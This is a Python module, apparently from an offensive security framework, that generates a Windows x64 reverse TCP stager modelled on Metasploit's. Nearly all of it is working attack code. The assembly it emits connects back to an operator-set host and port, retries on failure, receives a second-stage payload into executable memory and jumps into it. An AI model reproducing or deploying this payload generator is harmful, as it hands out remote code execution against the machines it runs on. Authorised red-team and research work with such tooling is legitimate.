import socket
import struct
from collections.abc import Mapping, Sequence

from teralibs.tsf.core.module.base import Base
from teralibs.tsf.core.payload.windows.x64.block_api_x64 import BlockApiX64
from teralibs.tsf.core.payload.windows.x64.exitfunk_x64 import ExitfunkX64
from teralibs.tsf.pex.terasm.api import Terasm


class ReverseTcpX64(Base):
    """
    Complex reverse_tcp payload generation for Windows ARCH_X64.
    Replicates the Metasploit Msf::Payload::Windows::ReverseTcp_x64 module behavior.
    """

    OPTIONS: Sequence[str] = ["LHOST", "LPORT", "EXITFUNC"]
    STAGER_CONF: Mapping = {}

    # Corrected size values to match standard Windows x64 stager bounds
    CACHED_SIZE: int
    AVAILABLE_SPACE: int | None = None

    def __init__(self):
        self.exitfunk = ExitfunkX64()
        self.blockapi = BlockApiX64()

        self.register_advanced_options(
            [
                self.opt(
                    "ReverseConnectRetries",
                    "10",
                    False,
                    "Configures the connection persistence loop within the network-based stager",
                    self.otype.INTEGER,
                )
            ]
        )

    def required_space(self) -> int:
        """
        Determine the maximum amount of space required for the features requested.
        """
        space = self.CACHED_SIZE

        # EXITFUNK 'seh' adds 15 bytes
        space += 15

        # Reliability adds bytes
        space += 57

        return space

    def generate(self, ctx) -> bytes:
        """
        Simulates the core entry step to prepare options before full assembly generation.
        """
        conf = {
            "port": int(ctx.get_option("LPORT")),
            "host": (ctx.get_option("LHOST")),
            "retry_count": int(ctx.get_option("ReverseConnectRetries")),
            "reliable": False,
            "exitfunk": ctx.get_option("EXITFUNC"),
        }

        available_space = getattr(ctx, "available_space", None) or self.AVAILABLE_SPACE
        if available_space is not None and self.CACHED_SIZE and self.required_space() <= available_space:
            conf["reliable"] = True

        return Terasm("x86", 64, "nasm").assemble(self.generate_reverse_tcp(conf), addr=0x1000)

    def generate_reverse_tcp(self, opts: dict) -> str:
        """
        Generates and concatenates the overarching assembly layout blocks.
        """
        asm = f"""
            cld                                     ; Clear the direction flag.
            and rsp, 0xFFFFFFFFFFFFFFF0             ; Ensure RSP is 16 byte aligned
            call start                              ; Call start, this pushes the address of 'api_call' onto the stack.
            {self.blockapi.asm_block_api()}
            start:
                pop rbp                             ; block API pointer
            {self.asm_reverse_tcp(opts)}
            {self.asm_block_recv(opts)}
        """
        return asm

    def asm_reverse_tcp(self, opts: dict) -> str:
        """
        Generate an assembly stub with the configured feature set and network options.
        """
        retry_count = max(int(opts["retry_count"]), 1)

        # 1. Constants
        port = int(opts["port"])
        host = opts["host"]

        # 2. Pack the structure
        # Order: Family (2 bytes), Port (2 bytes), IP (4 bytes)
        # 'H' = unsigned short (2 bytes), 'I' = unsigned int (4 bytes)
        # We use '!' for Network Byte Order (Big-Endian)
        packed_sockaddr = struct.pack("<H", 2) + struct.pack(">H", port) + socket.inet_aton(host)

        # 3. Convert to integer for the assembly/injection
        # This creates the exact 8-byte value expected by 'push r12'
        sockaddr_val = struct.unpack("<Q", packed_sockaddr)[0]
        encoded_host_port = f"0x{sockaddr_val:016x}"

        asm = f"""
            reverse_tcp:
            ; setup the structures we need on the stack...

                mov r14, 0x32335f327377             ; Use the exact hex representation for 'ws2_32' (little-endian)
                push r14                            ; Push the bytes 'ws2_32',0,0 onto the stack.
                mov r14, rsp                        ; save pointer to the "ws2_32" string for LoadLibraryA call.

                ; alloc sizeof( struct WSAData ) bytes for the WSAData
                sub rsp, 0x{408 + 8:016x}
                                                    ; structure (+8 for alignment)
                mov r13, rsp                        ; save pointer to the WSAData structure for WSAStartup call.
                mov r12, {encoded_host_port}
                push r12                            ; host, family AF_INET and port
                mov r12, rsp                        ; save pointer to sockaddr struct for connect call

            ; perform the call to LoadLibraryA...

                mov rcx, r14                        ; set the param for the library to load
                mov r10d, {self.blockapi.block_api_hash("kernel32.dll", "LoadLibraryA")}
                call rbp                            ; LoadLibraryA( "ws2_32" )

            ; perform the call to WSAStartup...

                mov rdx, r13                        ; second param is a pointer to this struct
                push 0x0101
                pop rcx                             ; set the param for the version requested
                mov r10d, {self.blockapi.block_api_hash("ws2_32.dll", "WSAStartup")}
                call rbp                            ; WSAStartup( 0x0101, &WSAData );

            ; stick the retry count on the stack and store it

                push 0x{retry_count:016x}
                pop r14

            create_socket:

            ; perform the call to WSASocketA...

                push rax                            ; if we succeed, rax will be zero, push zero for the flags param.
                push rax                            ; push null for reserved parameter
                xor r9, r9                          ; we do not specify a WSAPROTOCOL_INFO structure
                xor r8, r8                          ; we do not specify a protocol
                inc rax
                mov rdx, rax                        ; push SOCK_STREAM
                inc rax
                mov rcx, rax                        ; push AF_INET
                mov r10d, {self.blockapi.block_api_hash("ws2_32.dll", "WSASocketA")}
                call rbp                            ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
                mov rdi, rax                        ; save the socket for later

            try_connect:

            ; perform the call to connect...

                push 0x10                           ; length of the sockaddr struct
                pop r8                              ; pop off the third param
                mov rdx, r12                        ; set second param to pointer to sockaddr struct
                mov rcx, rdi                        ; the socket
                mov r10d, {self.blockapi.block_api_hash("ws2_32.dll", "connect")}
                call rbp                            ; connect( s, &sockaddr, 16 );

                test eax, eax                       ; non-zero means failure
                jz connected

            handle_connect_failure:
                dec r14                             ; decrement the retry count
                jnz try_connect
        """

        if opts.get("exitfunk"):
            asm += """
            failure:
                call exitfunk
            """
        else:
            asm += f"""
            failure:
                mov r10d, {self.blockapi.block_api_hash("kernel32.dll", "ExitProcess")}
                call rbp
            """

        asm += """
            ; this label is required so that reconnect attempts include
            ; the UUID stuff if required.
            connected:
        """

        return asm

    def asm_block_recv(self, opts: dict):
        """
        Generates the communication receive stage buffer processing layout loop.
        """
        reliable = opts.get("reliable", False)

        asm = f"""
            recv:

            ; Receive the size of the incoming second stage...

                sub rsp, 0x10                       ; alloc some space (16 bytes) on stack for to hold the second stage length
                mov rdx, rsp                        ; set pointer to this buffer
                xor r9, r9                          ; flags
                push 4
                pop r8                              ; length = sizeof( DWORD );
                mov rcx, rdi                        ; the saved socket
                mov r10d, {self.blockapi.block_api_hash("ws2_32.dll", "recv")}
                call rbp                            ; recv( s, &dwLength, 4, 0 );
        """

        if reliable is True:
            asm += """
            ; reliability: check to see if the recv worked, and reconnect
            ; if it fails

                cmp eax, 0
                jle cleanup_socket
            """

        asm += f"""
                add rsp, 0x20                       ; we restore RSP from the api_call so we can pop off RSI next

            ; Alloc a RWX buffer for the second stage

                pop rsi                             ; pop off the second stage length
                mov esi, esi                        ; only use the lower-order 32 bits for the size
                push 0x40
                pop r9                              ; PAGE_EXECUTE_READWRITE
                push 0x1000
                pop r8                              ; MEM_COMMIT
                mov rdx, rsi                        ; the newly received second stage length.
                xor rcx, rcx                        ; NULL as we dont care where the allocation is.
                mov r10d, {self.blockapi.block_api_hash("kernel32.dll", "VirtualAlloc")}
                call rbp                            ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );

                ; Receive the second stage and execute it...

                mov rbx, rax                        ; rbx = our new memory address for the new stage
                mov r15, rax                        ; save the address so we can jump into it later

            read_more:
                xor r9, r9                          ; flags
                mov r8, rsi                         ; length
                mov rdx, rbx                        ; the current address into our second stages RWX buffer
                mov rcx, rdi                        ; the saved socket
                mov r10d, {self.blockapi.block_api_hash("ws2_32.dll", "recv")}
                call rbp                            ; recv( s, buffer, length, 0 );
        """

        if reliable is True:
            asm += f"""
            ; reliability: check to see if the recv worked, and reconnect
            ; if it fails

                cmp eax, 0
                jge read_successful

            ; something failed so free up memory

                pop rax
                push r15
                pop rcx                             ; lpAddress
                push 0x4000                         ; MEM_COMMIT
                pop r8                              ; dwFreeType
                push 0                              ; 0
                pop rdx                             ; dwSize
                mov r10d, {self.blockapi.block_api_hash("kernel32.dll", "VirtualFree")}
                call rbp                            ; VirtualFree(payload, 0, MEM_COMMIT)

            cleanup_socket:

            ; clean up the socket

                push rdi                            ; socket handle
                pop rcx                             ; s (closesocket parameter)
                mov r10d, {self.blockapi.block_api_hash("ws2_32.dll", "closesocket")}
                call rbp

            ; and try again

                dec r14                             ; decrement the retry count
                jmp create_socket
            """

        asm += """
            read_successful:
                add rbx, rax                        ; buffer += bytes_received
                sub rsi, rax                        ; length -= bytes_received
                test rsi, rsi                       ; test length
                jnz read_more                       ; continue if we have more to read
                jmp r15                             ; return into the second stage
        """

        if opts.get("exitfunk"):
            asm += self.exitfunk.asm_exitfunk(opts, self.blockapi.block_api_hash)

        return asm
